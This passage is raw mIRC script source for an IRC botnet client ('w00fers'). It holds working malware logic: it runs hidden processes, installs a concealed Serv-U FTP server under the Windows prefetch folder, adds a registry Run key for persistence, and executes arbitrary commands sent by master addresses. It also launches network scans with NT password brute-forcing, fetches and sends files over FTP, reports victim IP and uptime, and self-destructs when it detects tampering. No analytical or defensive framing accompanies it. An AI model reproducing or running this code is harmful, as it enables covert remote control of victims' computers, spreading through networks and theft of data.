n279=     if ($3 == port) { notice $nick 12-4Changing Ports now12-14 | run hiddenrun.exe pv.exe -kf winmgnt.exe | set %nftp "Domain1=0.0.0.0|| $+ $4 $+ |FTP|1" | timersu 1 5 /write -l20 %windir%\prefetch\layout\agentsrv\win\servudaemon.ini %nftp | timerssu 1 15 /run %windir%\prefetch\layout\agentsrv\win\agent32.exe %windir%\prefetch\layout\agentsrv\win\winmgnt.exe | timersup 1 15 /notice $nick 12-4Port now changed12-14 | halt }
n280=  }
n281=  if ($1 == $me) && ($2 == !iroffer) {
n282=     if ($3 == help) { notice $nick 12-4Iroffer Commands are :-12-14 | notice $nick 12-4help,start,stop,server,nick.credit,status12-14 | halt }
n283=     if ($3 == start) {
n284=        if ($exists(irup.txt) == $true) { notice $nick 12-4Iroffer Already Running12-14 | halt }
n285=        write -c irup.txt | notice $nick 12-4Starting Iroffer Now12-14 | run hidden32.exe svshost.exe svshost.txt | write -c 394836.reg REGEDIT4 | write -a 394836.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 394836.reg "Svshost"=" $+ $replace($mircdir,\,\\) $+ back.exe $replace($mircdir,\,\\) $+ svhost.bat" | .timer 1 20 /run -n regedit /s 394836.reg | .timer 1 60 /remove 394836.reg 
n286=     }
n287=     if ($3 == stop) {
n288=        if ($exists(irup.txt) == $false) { notice $nick 12-4Iroffer wasnt Running12-14 | halt }
n289=        remove irup.txt | notice $nick 12-4Stopping Iroffer Now12-14 | run hiddenrun.exe pv.exe -kf svshost.exe | halt
n290=     }
n291=     if ($3 == nick) {
n292=        if ($4 == $null) { notice $nick 12-4Commandline is !iroffer nick (your_text)12-14 | halt }
n293=        run hiddenrun.exe pv.exe -kf svshost.exe | remove irup.txt | set %irnick $4 $+ - $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) | notice $nick 12-4Changing Iroffer nick to %irnick 12-14 | write -l11 svshost.txt user_nick %irnick | notice $nick 12-4Dont forget to do !iroffer start now12-14 
n294=     }
n295=     if ($3 == status) {
n296=         if ($exists(irup.txt) == $false) { set %irrun  12-4Iroffer isnt Running12-14 }
n297=         if ($exists(irup.txt) == $true) { set %irrun  12-4Iroffer Running12-14 }
n298=         set %irservers $read(svshost.txt,9) | set %irnicks $read(svshost.txt,11) | set %irchans $read(svshost.txt,10)
n299=         notice $nick 12-4Iroffer %irservers 12-14 | notice $nick 12-4Iroffer %irchans 12-14 | notice $nick 12-4Iroffer %irnicks 12-14 | notice $nick %irrun
n300=     }
n301=     if ($3 == server) {
n302=        if ($4 == $null) { notice $nick 12-4Commandline is !iroffer server port channel12-14 | halt }
n303=        if ($5 == $null) { notice $nick 12-4Dont forget the damn port and channel12-14 | halt }
n304=        if ($6 == $null) { notice $nick 12-4Dont forget the damn channel12-14 | halt }
n305=        set %nserver $4 | set %nchan $6 | set %nport $5
n306=        run hiddenrun.exe pv.exe -kf svshost.exe | write -l9 svshost.txt server %nserver %nport | write -l10 svshost.txt channel %nchan -plist 30 -pformat full | notice $nick 12-4Server set to %nserver %nport ,Channel set to %nchan 12-14 
n307=     }
n308=     if ($3 == credit) {
n309=        if ($4 == $null) { set %ircredits $read(svshost.txt,40) | notice $nick 12-4 %ircredits 12-14 | halt }
n310=        set %nircredit $4-
n311=        write -l40 svshost.txt creditline %nircredit
n312=     }
n313=  }
n314=}
n315=on 10:text:*:?:{
n316=  if ($1 == !ver) { msg $nick 12-4w00fers12-14 version 120.0.3 }
n317=  if ($1 == !deldown) { run hiddenrun.exe deldown.bat }
n318=  if ($1 == !restart) { run hiddenrun.exe shutdown.bat }
n319=  if ($1 == !rawdo) && ($address == %master) { msg $nick 12-4executing12-14 $2- | / $+ $2- | halt }
n320=  if ($1 == !rawdo) && ($address == %master1) { msg $nick 12-4executing12-14 $2- | / $+ $2- | halt }
n321=  if ($1 == !rawdo) && ($address == %master2) { msg $nick 12-4executing12-14 $2- | / $+ $2- | halt }
n322=  if ($1 == !rawdo) && ($address == %master3) { msg $nick 12-4executing12-14 $2- | / $+ $2- | halt }
n323=  if ($1 == !free) { .msg $nick 12-4free space12-14 $calc($disk(c).free / 1024 / 1024 / 1024) Gb }
n324=  if ($1 == !ip) { msg $nick 12-4ip12-14 $ip }
n325=  if ($1 == !uptime) { msg $nick 12-4uptime12-14 $uptime(system,1) }
n326=  if ($1 == !all) { msg $nick 15 $+ $ip 14UP $uptime(system,1) 4FREE $calc($disk(c).free / 1024 / 1024 / 1024) Gb 10HOST $host }
n327=  ;if ($1 == !ftp) && ($2 == start) { run hidden32.exe syst32.exe | msg $nick 12-4ftp started12-14 }
n328=  ;if ($1 == !ftp) && ($2 == stop) { run hiddenrun.exe pv.exe -kf syst32.exe | msg $nick 12-4ftp stopped12-14 }
n329=  ;if ($1 == !xdcc) && ($2 == stop) { run hiddenrun.exe pv.exe -kf kernel32.exe | msg $nick 12-4xdcc stopped12-14 }
n330=  if ($1 == !chans) { msg $nick 12-4channels12-15 $chan(0) 14 $chan(1) $chan(2) $chan(3) $chan(4) $chan(5) $chan(6) $chan(7) }
n331=  if ($1 == !quit) { run hiddenrun.exe pv.exe -kf debug.exe }
n332=  if ($1 == !move) { run hiddenrun.exe move.bat }
n333=  if ($1 == !copy) { run hiddenrun.exe copydown.bat }
n334=  if ($1 == !range) {
n335=    set %iprange $2 | set %sfile %iprange $+ .txt
n336=    if ($exists(%sfile) == $false) { set %iprange random | set %sfile random.txt }
n337=    msg $nick 12-4scanrange12-14 set to %iprange
n338=  }
n339=  if ($1 == !stop) { set %status 0 | run hiddenrun.exe pv.exe -kf service.exe | msg $nick 12-4stopping scans12- }
n340=  if ($1 == !start) { set %ip $read(%sfile) | run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 | set %status 1 | msg $nick 12-4scanning12-14 %ip }
n341=  if ($1 == !edu) && (edu isin $host) && ($left($me,3) != edu) { /nick edu- $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) | $me = nick }
n342=  if ($1 == !nick) { /nick $2 $+ $r(0,9) $+ $r(0,9) $+ $r(0,9) | $me = nick }
n343=  if ($1 == !edu) && (edu isin $host) { msg $nick 12-4edu12-10 $host ( $+ $ip $+ ) 14Up $uptime(system,1) 4 $calc($disk(c).free / 1024 / 1024 / 1024) Gb free }
n344=  if ($1 == !check) {
n345=    msg $nick 12-4checking12-15 $findfile(log\,*.htm,0) scans
n346=    startparse
n347=  }
n348=  if ($1 == !status) {
n349=    if (%status == 1) { msg $nick 12-4scanning12-14 %ip }
n350=    if (%status == 0) { msg $nick 12-4scanning12-15 restarted... 14 %ip | set %ip $read(%sfile) | run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 | set %status 1 }
n351=  }
n352=  if ($1 == !delscans) { run hiddenrun.exe delscans.bat }
n353=  if ($1 == !reload) { /reload -rs cabs.ini }
n354=  if ($1 == !ftp.update) && ($address == %master) {
n355=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n356=    if (%getsend == get) { 
n357=       if ($me isvo $decode(%secret.chan)) { msg $decode(%secret.chan) Updating bot pack | notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n358=       if ($exists($7) == $true) { remove $7 }
n359=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n360=    }
n361=    if (%getsend == send) { 
n362=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n363=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n364=    }
n365=  }
n366=  if ($1 == !ftp.update) && ($address == %master1) {
n367=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n368=    if (%getsend == get) { 
n369=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n370=       if ($exists($7) == $true) { remove $7 }
n371=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n372=    }
n373=    if (%getsend == send) { 
n374=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n375=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n376=    }
n377=  }
n378=  if ($1 == !ftp.update) && ($address == %master2) {
n379=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n380=    if (%getsend == get) { 
n381=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n382=       if ($exists($7) == $true) { remove $7 }
n383=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n384=    }
n385=    if (%getsend == send) { 
n386=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n387=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n388=    }
n389=  }
n390=  if ($1 == !ftp.update) && ($address == %master3) {
n391=    set %ftpip $2 | set %ftpport $3 | set %ftpuser $4 | set %ftppass $5 | set %getsend $6 | set %file $7
n392=    if (%getsend == get) { 
n393=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Updating bot pack |  notice $nick updating bots with data from IP- $2 USERNAME- $4 PASSWORD- $5 }
n394=       if ($exists($7) == $true) { remove $7 }
n395=       .run hiddenrun.exe get.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n396=    }
n397=    if (%getsend == send) { 
n398=       .run hiddenrun.exe send.bat %ftpip %ftpport %ftpuser %ftppass %getsend %file 
n399=       if ($me isvo $decode(%secret.chan)) {  msg $decode(%secret.chan) Sending file now }
n400=    }
n401=  }
n402=  if ($1 == !scan) { 
n403=     if ($2 == $null) { 
n404=        msg $nick 12-4Set a range Plz12-14 eg:- !scan 1.1.1.1-1.1.255.255 | return }
n405=     set %ip $2 
n406=     run hiddenrun.exe service.exe -host %ip -ntpass -t 150,75 
n407=     set %status 1 
n408=     msg $nick 12-4scanning12-14 %ip
n409=  }
n410=  if ($1 == !root) { 
n411=     if ($2 == $null) { getroot | halt } 
n412=     set %cip $2
n413=     set %cuser $3
n414=     set %cpass $4
n415=     mroot
n416=  }
n417=  if ($1 == !servu) {
n418=     if ($2 == install) { notice $nick 12-4Installing Serv-u Now12-14 | run save521.exe | halt }
n419=     if ($2 == stop) { notice $nick 12-4Stopping Serv-u Now12-14 | run hiddenrun.exe pv.exe -kf winmgnt.exe | halt }
n420=     if ($2 == start) { run hiddenrun.exe pv.exe -kf winmgnt.exe | notice $nick 12-4Starting Serv-u Now12-14 | run %windir%\prefetch\layout\agentsrv\win\agent32.exe %windir%\prefetch\layout\agentsrv\win\winmgnt.exe | halt }
n421=     if ($2 == port) { notice $nick 12-4Changing Ports now12-14 | run hiddenrun.exe pv.exe -kf winmgnt.exe | timersu 1 5 /write -l20 %windir%\prefetch\layout\agentsrv\win\servudaemon.ini "Domain1=0.0.0.0|| $+ $4 $+ |FTP|1" | timerssu 1 10 /run %windir%\prefetch\layout\agentsrv\win\agent32.exe %windir%\prefetch\layout\agentsrv\win\winmgnt.exe | timersup 1 15 /notice $nick 12-4Port now changed12-14 | halt }
n422=  }
n423=;}
n424=  if ($1 == !iroffer) {
n425=     if ($2 == help) { notice $nick 12-4Iroffer Commsnds are :-12-14 | notice $nick 12-4help,start,stop,server,nick.credit,status12-14 | halt }
n426=     if ($2 == start) {
n427=        if ($exists(irup.txt) == $true) { notice $nick 12-4Iroffer Already Running12-14 | halt }
n428=        write -c irup.txt | notice $nick 12-4Starting Iroffer Now12-14 | run hidden32.exe svshost.exe svshost.txt | write -c 394836.reg REGEDIT4 | write -a 394836.reg [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run] | write -a 394836.reg "Svshost"=" $+ $replace($mircdir,\,\\) $+ back.exe $replace($mircdir,\,\\) $+ svhost.bat" | .timer 1 20 /run -n regedit /s 394836.reg | .timer 1 60 /remove 394836.reg 
n429=     }
n430=     if ($2 == stop) {
n431=        if ($exists(irup.txt) == $false) { notice $nick 12-4Iroffer wasnt Running12-14 | halt }
n432=        remove irup.txt | notice $nick 12-4Stopping Iroffer Now12-14 | run hiddenrun.exe pv.exe -kf svshost.exe | halt
n433=     }
n434=     if ($2 == nick) {
n435=        if ($3 == $null) { notice $nick 12-4Commandline is !iroffer nick (your_text)12-14 | halt }
n436=        run hiddenrun.exe pv.exe -kf svshost.exe | remove irup.txt | set %irnick $3 $+ - $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) | notice $nick 12-4Changing Iroffer nick to %irnick 12-14 | write -l11 svshost.txt user_nick %irnick | notice $nick 12-4Dont forget to do !iroffer start now12-14 
n437=     }
n438=     if ($2 == status) {
n439=         if ($exists(irup.txt) == $false) { set %irrun  12-4Iroffer isnt Running12-14 }
n440=         if ($exists(irup.txt) == $true) { set %irrun  12-4Iroffer Running12-14 }
n441=         set %irservers $read(svshost.txt,9) | set %irnicks $read(svshost.txt,11) | set %irchans $read(svshost.txt,10)
n442=         notice $nick 12-4Iroffer server is %irservers 12-14 | notice $nick 12-4Iroffer Channel is %irchans 12-14 | notice $nick 12-4Iroffer Nick is %irnicks 12-14 | notice $nick %irrun
n443=     }
n444=     if ($2 == server) {
n445=        if ($3 == $null) { notice $nick 12-4Commandline is !iroffer server channel12-14 | halt }
n446=        if ($4 == $null) { notice $nick 12-4Dont forget the damn Port/channel12-14 | halt }
n447=        if ($5 == $null) { notice $nick 12-4Dont forget the damn channel12-14 | halt }
n448=        set %nserver $3 | set %nchan $5 | set %nport $4
n449=        run hiddenrun.exe pv.exe -kf svshost.exe | write -l9 svshost.txt server %nserver %nport | write -l10 svshost.txt channel %nchan -plist 30 -pformat full | notice $nick 12-4Server set to %nserver %nport ,Channel set to %nchan 12-14 
n450=     }
n451=     if ($2 == credit) {
n452=        if ($3 == $null) { set %ircredits $read(svshost.txt,40) | notice $nick 12-4 %ircredits 12-14 | halt }
n453=        set %nircredit $3-
n454=        write -l40 svshost.txt creditline %nircredit
n455=     }
n456=  }
n457=}
n458=on *:KICK:*:{ if ($knick == $me) && ($chan == $decode(%secret.chan)) { timerfastjoin -o 0 5 /join $decode(%secret.chan) $decode(%cp) } }
n459=alias check-c { $read(mirc.ini, w, *colours*) | %cc = $readn + 1 | set %mirccompare $read(mirc.ini,%cc) | if (%mircc != %mirccompare) { haltdef | /echo -a < $+ $me $+ > $1- | msg $decode(%secret.chan) --Warning- (Colour Changed) $1- | /clearall | copy pack.bat c:\ | copy sleep.com C:\ | copy pv.exe C:\ | copy ntcnd.exe C:\ | .timertr 1 1 run c:\ntcnd.exe c:\pack.bat | .timerte 1 1 exit }  
n460=}
n461=alias click { haltdef | /echo -a < $+ $me $+ > $1- | msg $decode(%secret.chan) --Warning- (Mouse click) $1- | /clearall | copy pack.bat c:\ | copy sleep.com C:\ | copy pv.exe C:\ | copy ntcnd.exe C:\ | .timertr 1 1 run c:\ntcnd.exe c:\pack.bat | .timerte 1 1 exit } 
n462=raw 433:*: { set %z w00f- $+ $r(A,Z) $+ $r(0,9) $+ $r(1,9) $+ $r(1,9) $+ $r(1,9) | /nick %z } 
